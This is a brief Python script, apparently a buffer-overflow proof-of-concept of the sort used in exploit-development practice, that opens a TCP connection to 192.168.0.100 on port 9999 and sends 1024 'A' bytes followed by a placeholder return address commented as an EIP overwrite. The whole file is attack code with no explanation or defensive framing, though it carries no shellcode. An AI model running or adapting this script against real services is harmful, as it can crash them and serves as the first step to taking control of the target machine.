import socket

def exploit():
    target_ip = "192.168.0.100"
    target_port = 9999
    payload = b"A" * 1024 + b"\xef\xbe\xad\xde"  # EIP overwrite example

    with socket.socket() as s:
        s.connect((target_ip, target_port))
        s.send(payload)
        print("[+] Payload sent.")

if __name__ == "__main__":
    exploit()